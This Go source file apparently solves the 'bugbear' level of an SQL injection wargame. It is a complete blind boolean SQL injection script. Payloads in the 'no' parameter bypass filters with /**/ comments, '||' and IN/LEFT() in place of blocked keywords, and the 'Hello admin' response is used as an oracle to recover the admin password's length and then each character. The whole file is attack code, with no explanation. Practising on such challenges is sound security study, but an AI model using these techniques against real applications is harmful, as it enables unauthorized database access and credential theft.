package problem

import (
	"fmt"
	"strconv"
	"strings"
)

func find_len5(file, session string) int{
	for length := 0 ; length < 50; length += 1 {
	s_pw := "1/**/||/**/LENGTH(pw)/**/IN/**/(" + strconv.Itoa(length) +")"
		param := map[string]string{
			"pw" : "1",
			"no" : s_pw,
		}
		
		contents := connect(file, param, session)
		if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
			return length
		}
	}
	return 0
}

func find_pw5(file string, length int, session string)string{
	result := ""
	NEXT_STR:
	for i := 1 ; i <= length; i += 1 {
		url_str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		for j :=0 ; j< len(url_str); j += 1 {
			s_pw := "1/**/||/**/\"" + result + string(url_str[j]) + "\"" + "/**/IN/**/(LEFT(pw," + strconv.Itoa(i) + "))"
			param := map[string]string{
				"pw" : "1",
				"no" : s_pw,
			}
			
			contents := connect(file, param, session)
			if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
				result += string(url_str[j])
				continue NEXT_STR
			}
		}
	}
	return result
}

func Bugbear(session string){
	file := "bugbear_b5bab623f7cba12e66b27364bedb710b.php"
	
	length := find_len5(file, session)
	//fmt.Println("Key length is "+ strconv.Itoa(length) + ".")
	
	pw_str := find_pw5(file,length, session)
	//fmt.Println("pw is "+ pw_str + ".")

	param := map[string]string{
		"pw" : pw_str,
		"no" : "1",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"BUGBEAR Clear!"){
		fmt.Println("BUGBEAR Clear!")
	}
}